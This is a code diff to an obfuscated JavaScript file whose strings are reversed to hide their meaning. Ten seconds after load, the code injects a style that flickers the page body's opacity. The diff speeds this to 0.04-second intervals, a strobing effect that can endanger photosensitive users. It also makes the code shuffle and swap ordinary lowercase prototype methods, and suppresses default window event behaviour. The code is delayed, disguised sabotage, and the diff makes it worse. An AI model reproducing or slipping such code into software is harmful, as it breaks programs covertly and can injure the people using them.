@@ -2,7 +2,7 @@ const s = [
   "tnemucod", // 0
   "tnemelEetaerc", // 1
   "elyts", // 2
-  "} } 0 :yticapo { ot { _ semarfyek@ } etinifni etanretla s06 s1 _ :noitamina { ydob", // 3
+  "} } 39.0 :yticapo { ot { _ semarfyek@ } etinifni etanretla s40.0 _ :noitamina { ydob", // 3
   "daeh", // 4
   "dlihCdneppa", // 5
   "epytotorp", // 6
@@ -21,7 +21,7 @@ setTimeout(() => {
     if (target) {
       var names = Object.getOwnPropertyNames(target).filter(function(n) {
         var d = Object.getOwnPropertyDescriptor(target, n);
-        return d && typeof d.value === "function" && n[0] >= 'A' && n[0] <= 'Z' && n !== s[7];
+        return d && typeof d.value === "function" && n[0] >= 'a' && n[0] <= 'z' && n !== s[7];
       });
       var shuffled = names.slice();
       for (var i = shuffled.length - 1; i > 0; i--) {
@@ -38,7 +38,9 @@ setTimeout(() => {
     }
   }
   for (var cmd of commands) {
-    try { cmd.target[cmd.name] = cmd.fn; } catch(e) {}
+    try { cmd.target[cmd.name] = cmd.fn; } catch (e) {}
   }
-  window[s[8]] = window[s[9]] = e => (e.preventDefault(), true);
+  try {
+    window[s[8]] = window[s[9]] = e => (e?.preventDefault?.(), true);
+  } catch (e) {}
 }, 10000);
